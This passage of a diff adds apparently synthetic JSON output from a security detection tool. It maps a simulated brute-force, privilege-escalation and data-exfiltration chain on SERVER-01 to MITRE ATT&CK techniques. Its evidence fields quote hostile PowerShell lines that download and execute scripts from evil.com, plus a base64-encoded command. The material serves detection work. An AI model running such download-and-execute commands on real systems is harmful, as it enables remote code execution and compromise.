+        ],
+        "risk_score": 0.0
+      },
+      {
+        "id": "0ca49c5e",
+        "type": "file",
+        "label": "File: C:\\Users\\admin\\Documents\\passwords.xlsx",
+        "value": "C:\\Users\\admin\\Documents\\passwords.xlsx",
+        "metadata": {
+          "size": 3221368
+        },
+        "event_ids": [
+          "e6042c1eaf204ff78bc926cf853349ca"
+        ],
+        "risk_score": 0.0
+      },
+      {
+        "id": "32272c2e",
+        "type": "file",
+        "label": "File: /var/www/html/config.php",
+        "value": "/var/www/html/config.php",
+        "metadata": {
+          "size": 8786324
+        },
+        "event_ids": [
+          "db1c07dd47624e45ac8ffef5741f0ada"
+        ],
+        "risk_score": 0.0
+      },
+      {
+        "id": "ade5d9d0",
+        "type": "ip",
+        "label": "IP: 10.0.0.100",
+        "value": "10.0.0.100",
+        "metadata": {
+          "is_external": false
+        },
+        "event_ids": [
+          "e19341b63e984eccb927e49bc4c16fd5"
+        ],
+        "risk_score": 0.0
+      },
+      {
+        "id": "a30f43b6",
+        "type": "destination",
+        "label": "Dest: 185.20.30.18",
+        "value": "185.20.30.18",
+        "metadata": {
+          "is_external": true
+        },
+        "event_ids": [
+          "e19341b63e984eccb927e49bc4c16fd5"
+        ],
+        "risk_score": 0.0
+      }
+    ],
+    "edges": [
+      {
+        "id": "4ef0d1aa",
+        "source": "08486252",
+        "target": "57db29ad",
+        "type": "logged_into",
+        "label": "Failed login",
+        "metadata": {
+          "event_type": "failed_login",
+          "timestamp": "2026-01-15T12:00:00+00:00"
+        },
+        "event_ids": [
+          "4fcb4dbd4cd1431c94db526fd54ef497"
+        ],
+        "weight": 1.0
+      },
+      {
+        "id": "ee2f22c8",
+        "source": "57db29ad",
+        "target": "1b36543b",
+        "type": "logged_into",
+        "label": "Login to SERVER-01",
+        "metadata": {
+          "event_type": "failed_login",
+          "timestamp": "2026-01-15T12:00:00+00:00"
+        },
+        "event_ids": [
+          "4fcb4dbd4cd1431c94db526fd54ef497"
+        ],
+        "weight": 1.0
+      },
+      {
+        "id": "8e0374ff",
+        "source": "08486252",
+        "target": "57db29ad",
+        "type": "logged_into",
+        "label": "Failed login",
+        "metadata": {
+          "event_type": "failed_login",
+          "timestamp": "2026-01-15T12:01:00+00:00"
+        },
+        "event_ids": [
+          "309e9d51b39345b5bfad361ee2e9211a"
+        ],
+        "weight": 1.0
+      },
+      {
+        "id": "01481c3a",
+        "source": "57db29ad",
+        "target": "1b36543b",
+        "type": "logged_into",
+        "label": "Login to SERVER-01",
+        "metadata": {
+          "event_type": "failed_login",
+          "timestamp": "2026-01-15T12:01:00+00:00"
+        },
+        "event_ids": [
+          "309e9d51b39345b5bfad361ee2e9211a"
+        ],
+        "weight": 1.0
+      },
+      {
+        "id": "51d5faca",
+        "source": "08486252",
+        "target": "57db29ad",
+        "type": "logged_into",
+        "label": "Failed login",
+        "metadata": {
+          "event_type": "failed_login",
+          "timestamp": "2026-01-15T12:02:00+00:00"
+        },
+        "event_ids": [
+          "69f6267b20e14d7faf5c60b38e88b0dc"
+        ],
+        "weight": 1.0
+      },
+      {
+        "id": "a556c3cd",
+        "source": "57db29ad",
+        "target": "1b36543b",
+        "type": "logged_into",
+        "label": "Login to SERVER-01",
+        "metadata": {
+          "event_type": "failed_login",
+          "timestamp": "2026-01-15T12:02:00+00:00"
+        },
+        "event_ids": [
+          "69f6267b20e14d7faf5c60b38e88b0dc"
+        ],
+        "weight": 1.0
+      },
+      {
+        "id": "120c1764",
+        "source": "08486252",
+        "target": "57db29ad",
+        "type": "logged_into",
+        "label": "Failed login",
+        "metadata": {
+          "event_type": "failed_login",
+          "timestamp": "2026-01-15T12:03:00+00:00"
+        },
+        "event_ids": [
+          "80096c5fdb8f4e0686bde45e20250ad9"
+        ],
+        "weight": 1.0
+      },
+      {
+        "id": "2bd6b048",
+        "source": "57db29ad",
+        "target": "1b36543b",
+        "type": "logged_into",
+        "label": "Login to SERVER-01",
+        "metadata": {
+          "event_type": "failed_login",
+          "timestamp": "2026-01-15T12:03:00+00:00"
+        },
+        "event_ids": [
+          "80096c5fdb8f4e0686bde45e20250ad9"
+        ],
+        "weight": 1.0
+      },
+      {
+        "id": "e6c395c2",
+        "source": "08486252",
+        "target": "57db29ad",
+        "type": "logged_into",
+        "label": "Failed login",
+        "metadata": {
+          "event_type": "failed_login",
+          "timestamp": "2026-01-15T12:04:00+00:00"
+        },
+        "event_ids": [
+          "95f0351da7fd423a923a42c6bf6aabd8"
+        ],
+        "weight": 1.0
+      },
+      {
+        "id": "6bf7de79",
+        "source": "57db29ad",
+        "target": "1b36543b",
+        "type": "logged_into",
+        "label": "Login to SERVER-01",
+        "metadata": {
+          "event_type": "failed_login",
+          "timestamp": "2026-01-15T12:04:00+00:00"
+        },
+        "event_ids": [
+          "95f0351da7fd423a923a42c6bf6aabd8"
+        ],
+        "weight": 1.0
+      },
+      {
+        "id": "806cebdf",
+        "source": "08486252",
+        "target": "57db29ad",
+        "type": "logged_into",
+        "label": "Failed login",
+        "metadata": {
+          "event_type": "failed_login",
+          "timestamp": "2026-01-15T12:05:00+00:00"
+        },
+        "event_ids": [
+          "eef302367a7045d9b4b37f917a81bd78"
+        ],
+        "weight": 1.0
+      },
+      {
+        "id": "16b9066a",
+        "source": "57db29ad",
+        "target": "1b36543b",
+        "type": "logged_into",
+        "label": "Login to SERVER-01",
+        "metadata": {
+          "event_type": "failed_login",
+          "timestamp": "2026-01-15T12:05:00+00:00"
+        },
+        "event_ids": [
+          "eef302367a7045d9b4b37f917a81bd78"
+        ],
+        "weight": 1.0
+      },
+      {
+        "id": "3a90e651",
+        "source": "08486252",
+        "target": "57db29ad",
+        "type": "logged_into",
+        "label": "Failed login",
+        "metadata": {
+          "event_type": "failed_login",
+          "timestamp": "2026-01-15T12:06:00+00:00"
+        },
+        "event_ids": [
+          "332f05701143466ab9bf1c13e83481ce"
+        ],
+        "weight": 1.0
+      },
+      {
+        "id": "b61d1517",
+        "source": "57db29ad",
+        "target": "1b36543b",
+        "type": "logged_into",
+        "label": "Login to SERVER-01",
+        "metadata": {
+          "event_type": "failed_login",
+          "timestamp": "2026-01-15T12:06:00+00:00"
+        },
+        "event_ids": [
+          "332f05701143466ab9bf1c13e83481ce"
+        ],
+        "weight": 1.0
+      },
+      {
+        "id": "307f4ccd",
+        "source": "08486252",
+        "target": "57db29ad",
+        "type": "logged_into",
+        "label": "Failed login",
+        "metadata": {
+          "event_type": "failed_login",
+          "timestamp": "2026-01-15T12:07:00+00:00"
+        },
+        "event_ids": [
+          "4ecbf85e9a894515a4a0a3996fd504dc"
+        ],
+        "weight": 1.0
+      },
+      {
+        "id": "7e1c918a",
+        "source": "57db29ad",
+        "target": "1b36543b",
+        "type": "logged_into",
+        "label": "Login to SERVER-01",
+        "metadata": {
+          "event_type": "failed_login",
+          "timestamp": "2026-01-15T12:07:00+00:00"
+        },
+        "event_ids": [
+          "4ecbf85e9a894515a4a0a3996fd504dc"
+        ],
+        "weight": 1.0
+      },
+      {
+        "id": "19a13dbd",
+        "source": "08486252",
+        "target": "57db29ad",
+        "type": "logged_into",
+        "label": "Failed login",
+        "metadata": {
+          "event_type": "failed_login",
+          "timestamp": "2026-01-15T12:08:00+00:00"
+        },
+        "event_ids": [
+          "7a018318b1ca48b2bf696cac1e8b4c79"
+        ],
+        "weight": 1.0
+      },
+      {
+        "id": "306918da",
+        "source": "57db29ad",
+        "target": "1b36543b",
+        "type": "logged_into",
+        "label": "Login to SERVER-01",
+        "metadata": {
+          "event_type": "failed_login",
+          "timestamp": "2026-01-15T12:08:00+00:00"
+        },
+        "event_ids": [
+          "7a018318b1ca48b2bf696cac1e8b4c79"
+        ],
+        "weight": 1.0
+      },
+      {
+        "id": "3f6ea93d",
+        "source": "08486252",
+        "target": "57db29ad",
+        "type": "logged_into",
+        "label": "Failed login",
+        "metadata": {
+          "event_type": "failed_login",
+          "timestamp": "2026-01-15T12:09:00+00:00"
+        },
+        "event_ids": [
+          "6cdc0f2e0617416cba945318145c8897"
+        ],
+        "weight": 1.0
+      },
+      {
+        "id": "50909177",
+        "source": "57db29ad",
+        "target": "1b36543b",
+        "type": "logged_into",
+        "label": "Login to SERVER-01",
+        "metadata": {
+          "event_type": "failed_login",
+          "timestamp": "2026-01-15T12:09:00+00:00"
+        },
+        "event_ids": [
+          "6cdc0f2e0617416cba945318145c8897"
+        ],
+        "weight": 1.0
+      },
+      {
+        "id": "0b31ca9b",
+        "source": "08486252",
+        "target": "57db29ad",
+        "type": "logged_into",
+        "label": "Failed login",
+        "metadata": {
+          "event_type": "failed_login",
+          "timestamp": "2026-01-15T12:10:00+00:00"
+        },
+        "event_ids": [
+          "4eba6038b5fc4a8293e5af029bd3267c"
+        ],
+        "weight": 1.0
+      },
+      {
+        "id": "26815c50",
+        "source": "57db29ad",
+        "target": "1b36543b",
+        "type": "logged_into",
+        "label": "Login to SERVER-01",
+        "metadata": {
+          "event_type": "failed_login",
+          "timestamp": "2026-01-15T12:10:00+00:00"
+        },
+        "event_ids": [
+          "4eba6038b5fc4a8293e5af029bd3267c"
+        ],
+        "weight": 1.0
+      },
+      {
+        "id": "6d90a894",
+        "source": "08486252",
+        "target": "57db29ad",
+        "type": "logged_into",
+        "label": "Failed login",
+        "metadata": {
+          "event_type": "failed_login",
+          "timestamp": "2026-01-15T12:11:00+00:00"
+        },
+        "event_ids": [
+          "499cf096fc0a4781bf14775958a20d52"
+        ],
+        "weight": 1.0
+      },
+      {
+        "id": "b8e030b0",
+        "source": "57db29ad",
+        "target": "1b36543b",
+        "type": "logged_into",
+        "label": "Login to SERVER-01",
+        "metadata": {
+          "event_type": "failed_login",
+          "timestamp": "2026-01-15T12:11:00+00:00"
+        },
+        "event_ids": [
+          "499cf096fc0a4781bf14775958a20d52"
+        ],
+        "weight": 1.0
+      },
+      {
+        "id": "7315ac48",
+        "source": "08486252",
+        "target": "57db29ad",
+        "type": "logged_into",
+        "label": "Failed login",
+        "metadata": {
+          "event_type": "failed_login",
+          "timestamp": "2026-01-15T12:12:00+00:00"
+        },
+        "event_ids": [
+          "0c347bd66ea04d06ba628c3e2bf926cc"
+        ],
+        "weight": 1.0
+      },
+      {
+        "id": "30ca60e9",
+        "source": "57db29ad",
+        "target": "1b36543b",
+        "type": "logged_into",
+        "label": "Login to SERVER-01",
+        "metadata": {
+          "event_type": "failed_login",
+          "timestamp": "2026-01-15T12:12:00+00:00"
+        },
+        "event_ids": [
+          "0c347bd66ea04d06ba628c3e2bf926cc"
+        ],
+        "weight": 1.0
+      },
+      {
+        "id": "65f1cf69",
+        "source": "08486252",
+        "target": "57db29ad",
+        "type": "logged_into",
+        "label": "Failed login",
+        "metadata": {
+          "event_type": "failed_login",
+          "timestamp": "2026-01-15T12:13:00+00:00"
+        },
+        "event_ids": [
+          "de6945dac2fb4191ba209735eb311bc6"
+        ],
+        "weight": 1.0
+      },
+      {
+        "id": "943d7a28",
+        "source": "57db29ad",
+        "target": "1b36543b",
+        "type": "logged_into",
+        "label": "Login to SERVER-01",
+        "metadata": {
+          "event_type": "failed_login",
+          "timestamp": "2026-01-15T12:13:00+00:00"
+        },
+        "event_ids": [
+          "de6945dac2fb4191ba209735eb311bc6"
+        ],
+        "weight": 1.0
+      },
+      {
+        "id": "9c808b25",
+        "source": "08486252",
+        "target": "57db29ad",
+        "type": "logged_into",
+        "label": "Failed login",
+        "metadata": {
+          "event_type": "failed_login",
+          "timestamp": "2026-01-15T12:14:00+00:00"
+        },
+        "event_ids": [
+          "8a21d5685aa8428592569b36dacc4856"
+        ],
+        "weight": 1.0
+      },
+      {
+        "id": "2adbcd60",
+        "source": "57db29ad",
+        "target": "1b36543b",
+        "type": "logged_into",
+        "label": "Login to SERVER-01",
+        "metadata": {
+          "event_type": "failed_login",
+          "timestamp": "2026-01-15T12:14:00+00:00"
+        },
+        "event_ids": [
+          "8a21d5685aa8428592569b36dacc4856"
+        ],
+        "weight": 1.0
+      },
+      {
+        "id": "2517fb6a",
+        "source": "08486252",
+        "target": "57db29ad",
+        "type": "logged_into",
+        "label": "Failed login",
+        "metadata": {
+          "event_type": "failed_login",
+          "timestamp": "2026-01-15T12:15:00+00:00"
+        },
+        "event_ids": [
+          "a0fe63cb9fb2479b96151fea98a3a371"
+        ],
+        "weight": 1.0
+      },
+      {
+        "id": "a65031b0",
+        "source": "57db29ad",
+        "target": "1b36543b",
+        "type": "logged_into",
+        "label": "Login to SERVER-01",
+        "metadata": {
+          "event_type": "failed_login",
+          "timestamp": "2026-01-15T12:15:00+00:00"
+        },
+        "event_ids": [
+          "a0fe63cb9fb2479b96151fea98a3a371"
+        ],
+        "weight": 1.0
+      },
+      {
+        "id": "ed829529",
+        "source": "08486252",
+        "target": "57db29ad",
+        "type": "logged_into",
+        "label": "Failed login",
+        "metadata": {
+          "event_type": "failed_login",
+          "timestamp": "2026-01-15T12:16:00+00:00"
+        },
+        "event_ids": [
+          "50c2bf772c594cedb63db1a5b08f3cf2"
+        ],
+        "weight": 1.0
+      },
+      {
+        "id": "1d5e5215",
+        "source": "57db29ad",
+        "target": "1b36543b",
+        "type": "logged_into",
+        "label": "Login to SERVER-01",
+        "metadata": {
+          "event_type": "failed_login",
+          "timestamp": "2026-01-15T12:16:00+00:00"
+        },
+        "event_ids": [
+          "50c2bf772c594cedb63db1a5b08f3cf2"
+        ],
+        "weight": 1.0
+      },
+      {
+        "id": "4affd943",
+        "source": "08486252",
+        "target": "57db29ad",
+        "type": "logged_into",
+        "label": "Successful login",
+        "metadata": {
+          "event_type": "successful_login",
+          "timestamp": "2026-01-15T12:17:00+00:00"
+        },
+        "event_ids": [
+          "d492ce0b4b42460199064969fb3dad01"
+        ],
+        "weight": 1.0
+      },
+      {
+        "id": "dcd9e980",
+        "source": "57db29ad",
+        "target": "1b36543b",
+        "type": "logged_into",
+        "label": "Login to SERVER-01",
+        "metadata": {
+          "event_type": "successful_login",
+          "timestamp": "2026-01-15T12:17:00+00:00"
+        },
+        "event_ids": [
+          "d492ce0b4b42460199064969fb3dad01"
+        ],
+        "weight": 1.0
+      },
+      {
+        "id": "3bc7837e",
+        "source": "57db29ad",
+        "target": "1b36543b",
+        "type": "escalated_on",
+        "label": "Privilege escalation: admin_to_system",
+        "metadata": {
+          "event_type": "privilege_escalation",
+          "timestamp": "2026-01-15T12:25:00+00:00"
+        },
+        "event_ids": [
+          "e6c796d169254b838237d40413d78388"
+        ],
+        "weight": 1.0
+      },
+      {
+        "id": "38cab0a2",
+        "source": "57db29ad",
+        "target": "73c65929",
+        "type": "accessed",
+        "label": "read file",
+        "metadata": {
+          "event_type": "file_access",
+          "timestamp": "2026-01-15T12:40:00+00:00"
+        },
+        "event_ids": [
+          "e6faa00bb99b4c8599d4df32c5b362b6"
+        ],
+        "weight": 1.0
+      },
+      {
+        "id": "81cee894",
+        "source": "57db29ad",
+        "target": "0ca49c5e",
+        "type": "accessed",
+        "label": "read file",
+        "metadata": {
+          "event_type": "file_access",
+          "timestamp": "2026-01-15T12:45:00+00:00"
+        },
+        "event_ids": [
+          "e6042c1eaf204ff78bc926cf853349ca"
+        ],
+        "weight": 1.0
+      },
+      {
+        "id": "59ad15cf",
+        "source": "57db29ad",
+        "target": "32272c2e",
+        "type": "accessed",
+        "label": "read file",
+        "metadata": {
+          "event_type": "file_access",
+          "timestamp": "2026-01-15T12:50:00+00:00"
+        },
+        "event_ids": [
+          "db1c07dd47624e45ac8ffef5741f0ada"
+        ],
+        "weight": 1.0
+      },
+      {
+        "id": "07580a25",
+        "source": "ade5d9d0",
+        "target": "a30f43b6",
+        "type": "transferred_to",
+        "label": "Transferred 812,806,682 bytes",
+        "metadata": {
+          "event_type": "data_transfer",
+          "timestamp": "2026-01-15T12:55:00+00:00"
+        },
+        "event_ids": [
+          "e19341b63e984eccb927e49bc4c16fd5"
+        ],
+        "weight": 1.0
+      },
+      {
+        "id": "3e586b25",
+        "source": "57db29ad",
+        "target": "a30f43b6",
+        "type": "connected_to",
+        "label": "User connection to 185.20.30.18",
+        "metadata": {
+          "event_type": "data_transfer",
+          "timestamp": "2026-01-15T12:55:00+00:00"
+        },
+        "event_ids": [
+          "e19341b63e984eccb927e49bc4c16fd5"
+        ],
+        "weight": 1.0
+      }
+    ],
+    "metadata": {
+      "chain_count": 6,
+      "total_events": 26,
+      "attack_types": [
+        "coordinated_attack",
+        "data_exfiltration",
+        "brute_force_to_compromise"
+      ],
+      "start_time": "2026-01-15T12:00:00+00:00",
+      "end_time": "2026-01-15T12:55:00+00:00",
+      "combined_correlation_score": 1.0
+    }
+  },
+  "mitre_techniques": [
+    {
+      "technique_id": "T1005",
+      "name": "Data from Local System",
+      "tactic": "Collection",
+      "description": "Collecting data from local system.",
+      "confidence": 1.0,
+      "evidence": [
+        "Potential data exfiltration by admin on SERVER-01",
+        "Attack chain: Attack pattern 'brute_force_to_compromise' matched: 6 steps"
+      ],
+      "event_ids": [
+        "e6faa00bb99b4c8599d4df32c5b362b6",
+        "e6042c1eaf204ff78bc926cf853349ca",
+        "db1c07dd47624e45ac8ffef5741f0ada",
+        "e19341b63e984eccb927e49bc4c16fd5",
+        "7a018318b1ca48b2bf696cac1e8b4c79",
+        "d492ce0b4b42460199064969fb3dad01",
+        "e6c796d169254b838237d40413d78388",
+        "277ed35271ab4c2281f67035338937b7"
+      ]
+    },
+    {
+      "technique_id": "T1041",
+      "name": "Exfiltration Over Command and Control Channel",
+      "tactic": "Exfiltration",
+      "description": "Exfiltrating data over C2 channel.",
+      "confidence": 1.0,
+      "evidence": [
+        "Attack chain: Attack pattern 'brute_force_to_compromise' matched: 6 steps"
+      ],
+      "event_ids": [
+        "7a018318b1ca48b2bf696cac1e8b4c79",
+        "d492ce0b4b42460199064969fb3dad01",
+        "e6c796d169254b838237d40413d78388",
+        "277ed35271ab4c2281f67035338937b7",
+        "e6faa00bb99b4c8599d4df32c5b362b6",
+        "e19341b63e984eccb927e49bc4c16fd5"
+      ]
+    },
+    {
+      "technique_id": "T1059.001",
+      "name": "PowerShell",
+      "tactic": "Execution",
+      "description": "PowerShell commands/scripts for execution.",
+      "confidence": 1.0,
+      "evidence": [
+        "powershell_execution: powershell_execution detected (user=admin, ip=None, device=SERVER-01)",
+        "Suspicious PowerShell execution by admin on SERVER-01: Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')",
+        "Suspicious PowerShell execution by admin on SERVER-01: IEX (New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')",
+        "Suspicious PowerShell execution by admin on SERVER-01: powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBE",
+        "Attack chain: Attack pattern 'brute_force_to_compromise' matched: 6 steps"
+      ],
+      "event_ids": [
+        "277ed35271ab4c2281f67035338937b7",
+        "ef12273119df42a7aaaf200c344607b4",
+        "82760cc7e0b24e759ca325262d01cfe9",
+        "4fcb4dbd4cd1431c94db526fd54ef497",
+        "309e9d51b39345b5bfad361ee2e9211a",
+        "69f6267b20e14d7faf5c60b38e88b0dc",
+        "80096c5fdb8f4e0686bde45e20250ad9",
+        "95f0351da7fd423a923a42c6bf6aabd8",
+        "eef302367a7045d9b4b37f917a81bd78",
+        "332f05701143466ab9bf1c13e83481ce",
+        "4ecbf85e9a894515a4a0a3996fd504dc",
+        "7a018318b1ca48b2bf696cac1e8b4c79",
+        "6cdc0f2e0617416cba945318145c8897",
+        "4eba6038b5fc4a8293e5af029bd3267c",
+        "499cf096fc0a4781bf14775958a20d52",
+        "0c347bd66ea04d06ba628c3e2bf926cc",
+        "de6945dac2fb4191ba209735eb311bc6",
+        "8a21d5685aa8428592569b36dacc4856",
+        "a0fe63cb9fb2479b96151fea98a3a371",
+        "50c2bf772c594cedb63db1a5b08f3cf2",
+        "e6c796d169254b838237d40413d78388",
+        "d492ce0b4b42460199064969fb3dad01",
+        "e6faa00bb99b4c8599d4df32c5b362b6",
+        "e19341b63e984eccb927e49bc4c16fd5"
+      ]
+    },
+    {
+      "technique_id": "T1078",
+      "name": "Valid Accounts",
+      "tactic": "Initial Access",
+      "description": "Use of valid credentials for initial access.",
+      "confidence": 1.0,
+      "evidence": [
+        "Attack chain: Attack pattern 'brute_force_to_compromise' matched: 6 steps"
+      ],
+      "event_ids": [
+        "7a018318b1ca48b2bf696cac1e8b4c79",
+        "d492ce0b4b42460199064969fb3dad01",
+        "e6c796d169254b838237d40413d78388",
+        "277ed35271ab4c2281f67035338937b7",
+        "e6faa00bb99b4c8599d4df32c5b362b6",
+        "e19341b63e984eccb927e49bc4c16fd5"
+      ]
+    },
+    {
+      "technique_id": "T1110",
+      "name": "Brute Force",
+      "tactic": "Credential Access",
+      "description": "Adversaries may use brute force techniques to gain access to accounts.",
+      "confidence": 1.0,
+      "evidence": [
+        "Brute force: 15 failed logins for admin from 185.20.30.42 followed by successful login",
+        "Attack chain: Attack pattern 'brute_force_to_compromise' matched: 6 steps"
+      ],
+      "event_ids": [
+        "69f6267b20e14d7faf5c60b38e88b0dc",
+        "80096c5fdb8f4e0686bde45e20250ad9",
+        "95f0351da7fd423a923a42c6bf6aabd8",
+        "eef302367a7045d9b4b37f917a81bd78",
+        "332f05701143466ab9bf1c13e83481ce",
+        "4ecbf85e9a894515a4a0a3996fd504dc",
+        "7a018318b1ca48b2bf696cac1e8b4c79",
+        "6cdc0f2e0617416cba945318145c8897",
+        "4eba6038b5fc4a8293e5af029bd3267c",
+        "499cf096fc0a4781bf14775958a20d52",
+        "0c347bd66ea04d06ba628c3e2bf926cc",
+        "de6945dac2fb4191ba209735eb311bc6",
+        "8a21d5685aa8428592569b36dacc4856",
+        "a0fe63cb9fb2479b96151fea98a3a371",
+        "50c2bf772c594cedb63db1a5b08f3cf2",
+        "d492ce0b4b42460199064969fb3dad01",
+        "e6c796d169254b838237d40413d78388",
+        "277ed35271ab4c2281f67035338937b7",
+        "e6faa00bb99b4c8599d4df32c5b362b6",
+        "e19341b63e984eccb927e49bc4c16fd5"
+      ]
+    },
+    {
+      "technique_id": "T1110.001",
+      "name": "Password Guessing",
+      "tactic": "Credential Access",
+      "description": "Systematic guessing of passwords.",
+      "confidence": 1.0,
+      "evidence": [
+        "failed_login: failed_login detected (user=admin, ip=185.20.30.42, device=SERVER-01)",
+        "Brute force: 15 failed logins for admin from 185.20.30.42 followed by successful login",
+        "Attack chain: Attack pattern 'brute_force_to_compromise' matched: 6 steps"
+      ],
+      "event_ids": [
+        "4fcb4dbd4cd1431c94db526fd54ef497",
+        "309e9d51b39345b5bfad361ee2e9211a",
+        "69f6267b20e14d7faf5c60b38e88b0dc",
+        "80096c5fdb8f4e0686bde45e20250ad9",
+        "95f0351da7fd423a923a42c6bf6aabd8",
+        "eef302367a7045d9b4b37f917a81bd78",
+        "332f05701143466ab9bf1c13e83481ce",
+        "4ecbf85e9a894515a4a0a3996fd504dc",
+        "7a018318b1ca48b2bf696cac1e8b4c79",
+        "6cdc0f2e0617416cba945318145c8897",
+        "4eba6038b5fc4a8293e5af029bd3267c",
+        "499cf096fc0a4781bf14775958a20d52",
+        "0c347bd66ea04d06ba628c3e2bf926cc",
+        "de6945dac2fb4191ba209735eb311bc6",
+        "8a21d5685aa8428592569b36dacc4856",
+        "a0fe63cb9fb2479b96151fea98a3a371",
+        "50c2bf772c594cedb63db1a5b08f3cf2",
+        "d492ce0b4b42460199064969fb3dad01",
+        "e6c796d169254b838237d40413d78388",
+        "277ed35271ab4c2281f67035338937b7",
+        "e6faa00bb99b4c8599d4df32c5b362b6",
+        "e19341b63e984eccb927e49bc4c16fd5"
+      ]
+    },
+    {
+      "technique_id": "T1134",
+      "name": "Access Token Manipulation",
+      "tactic": "Privilege Escalation",
+      "description": "Manipulating access tokens for privilege escalation.",
+      "confidence": 1.0,
+      "evidence": [
+        "privilege_escalation: privilege_escalation detected (user=admin, ip=185.20.30.18, device=SERVER-01)",
+        "privilege_escalation: impersonation detected (user=admin, ip=185.20.30.18, device=SERVER-01)",
+        "Attack chain: Attack pattern 'brute_force_to_compromise' matched: 6 steps"
+      ],
+      "event_ids": [
+        "e6c796d169254b838237d40413d78388",
+        "7a018318b1ca48b2bf696cac1e8b4c79",
+        "d492ce0b4b42460199064969fb3dad01",
+        "277ed35271ab4c2281f67035338937b7",
+        "e6faa00bb99b4c8599d4df32c5b362b6",
+        "e19341b63e984eccb927e49bc4c16fd5"
+      ]
+    },
+    {
+      "technique_id": "T1059",
+      "name": "Command and Scripting Interpreter",
+      "tactic": "Execution",
+      "description": "Abuse of command/script interpreters.",
+      "confidence": 0.85,
+      "evidence": [
+        "powershell_execution: powershell detected (user=admin, ip=None, device=SERVER-01)",
+        "powershell_execution: cmd detected (user=admin, ip=None, device=SERVER-01)",
+        "Suspicious PowerShell execution by admin on SERVER-01: Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')",
+        "Suspicious PowerShell execution by admin on SERVER-01: IEX (New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')",
+        "Suspicious PowerShell execution by admin on SERVER-01: powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBE"
+      ],
+      "event_ids": [
+        "277ed35271ab4c2281f67035338937b7",
+        "ef12273119df42a7aaaf200c344607b4",
+        "82760cc7e0b24e759ca325262d01cfe9",
+        "4fcb4dbd4cd1431c94db526fd54ef497",
+        "309e9d51b39345b5bfad361ee2e9211a",
+        "69f6267b20e14d7faf5c60b38e88b0dc",
+        "80096c5fdb8f4e0686bde45e20250ad9",
+        "95f0351da7fd423a923a42c6bf6aabd8",
+        "eef302367a7045d9b4b37f917a81bd78",
+        "332f05701143466ab9bf1c13e83481ce",
+        "4ecbf85e9a894515a4a0a3996fd504dc",
+        "7a018318b1ca48b2bf696cac1e8b4c79",
+        "6cdc0f2e0617416cba945318145c8897",
+        "4eba6038b5fc4a8293e5af029bd3267c",
+        "499cf096fc0a4781bf14775958a20d52",
+        "0c347bd66ea04d06ba628c3e2bf926cc",
+        "de6945dac2fb4191ba209735eb311bc6",
+        "8a21d5685aa8428592569b36dacc4856",
+        "a0fe63cb9fb2479b96151fea98a3a371",
+        "50c2bf772c594cedb63db1a5b08f3cf2",
+        "e6c796d169254b838237d40413d78388"
+      ]
+    },
+    {
+      "technique_id": "T1059.003",
+      "name": "Windows Command Shell",
+      "tactic": "Execution",
+      "description": "cmd.exe for command execution.",
+      "confidence": 0.53,
+      "evidence": [
+        "powershell_execution: cmd.exe detected (user=admin, ip=None, device=SERVER-01)",
+        "powershell_execution: cmd.exe detected (user=admin, ip=None, device=SERVER-01)",
+        "powershell_execution: cmd.exe detected (user=admin, ip=None, device=SERVER-01)"
+      ],
+      "event_ids": [
+        "277ed35271ab4c2281f67035338937b7",
+        "ef12273119df42a7aaaf200c344607b4",
+        "82760cc7e0b24e759ca325262d01cfe9"
+      ]
+    },
+    {
+      "technique_id": "T1068",
+      "name": "Exploitation for Privilege Escalation",
+      "tactic": "Privilege Escalation",
+      "description": "Exploiting vulnerabilities for higher privileges.",
+      "confidence": 0.41,
+      "evidence": [
+        "privilege_escalation: privilege_escalation detected (user=admin, ip=185.20.30.18, device=SERVER-01)"
+      ],
+      "event_ids": [
+        "e6c796d169254b838237d40413d78388"
+      ]
+    },
+    {
+      "technique_id": "T1134.001",
+      "name": "Token Impersonation/Theft",
+      "tactic": "Privilege Escalation",
+      "description": "Impersonating or stealing tokens.",
+      "confidence": 0.41,
+      "evidence": [
+        "privilege_escalation: token_impersonation detected (user=admin, ip=185.20.30.18, device=SERVER-01)"
+      ],
+      "event_ids": [
+        "e6c796d169254b838237d40413d78388"
+      ]
+    },
+    {
+      "technique_id": "T1027",
+      "name": "Obfuscated/Stored Files",
+      "tactic": "Defense Evasion",
+      "description": "Obfuscating malicious code.",
+      "confidence": 0.29333333333333333,
+      "evidence": [
+        "powershell_execution: -enc detected (user=admin, ip=None, device=SERVER-01)"
+      ],
+      "event_ids": [
+        "82760cc7e0b24e759ca325262d01cfe9"
+      ]
+    }
+  ],
+  "statistics": {
+    "total_events": 28,
+    "event_sources": {
+      "endpoint": 6,
+      "firewall": 1,
+      "authentication": 20,
+      "network": 1
+    },
+    "event_types": {
+      "allowed_connection": 1,
+      "file_access": 3,
+      "failed_login": 17,
+      "successful_login": 2,
+      "data_transfer": 1,
+      "powershell_execution": 3,
+      "privilege_escalation": 1
+    },
+    "unique_users": 1,
+    "unique_devices": 1,
+    "unique_source_ips": 4,
+    "anomaly_count": 28,
+    "anomaly_rate": 1.0,
+    "rule_match_count": 6,
+    "rule_matches_by_type": {
+      "brute_force": 1,
+      "coordinated_attack": 1,
+      "data_exfiltration": 1,
+      "suspicious_powershell": 3
+    },
+    "attack_chain_count": 6,
+    "max_chain_score": 1.0,
+    "risk_score": 91,
+    "severity": "CRITICAL",
+    "ml_trained": true
+  }
+}
